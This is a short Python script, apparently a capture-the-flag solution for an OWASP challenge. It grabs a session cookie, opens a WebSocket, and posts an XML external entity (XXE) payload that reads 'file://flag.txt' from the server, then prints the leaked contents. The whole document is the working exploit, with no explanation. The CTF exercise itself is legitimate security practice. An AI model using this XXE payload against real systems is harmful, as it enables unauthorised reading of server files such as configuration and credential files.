#!/usr/bin/env python3

import requests
import time

from websocket import create_connection


# Authorize in Express app
r = requests.get('http://elfs.owasp.si:3333')
cookie = r.headers['Set-Cookie'].split(';')[0]
print('Cookie is ', cookie)


# Create Websocket connection
headers = {
    'Cookie': cookie,
}

ws = create_connection("ws://elfs.owasp.si:3333/", header=headers)

headers = {
    'Content-type': 'application/xml',
    'Cookie': cookie,
}

data = b'<?xml version="1.0"?> <!DOCTYPE msg [ <!ENTITY lol SYSTEM "file://flag.txt">]> <msg>&lol;</msg>'

r = requests.post('http://elfs.owasp.si:3333/send', headers=headers, data=data)

result = bytes(ws.recv(), 'utf-8')
print(result)
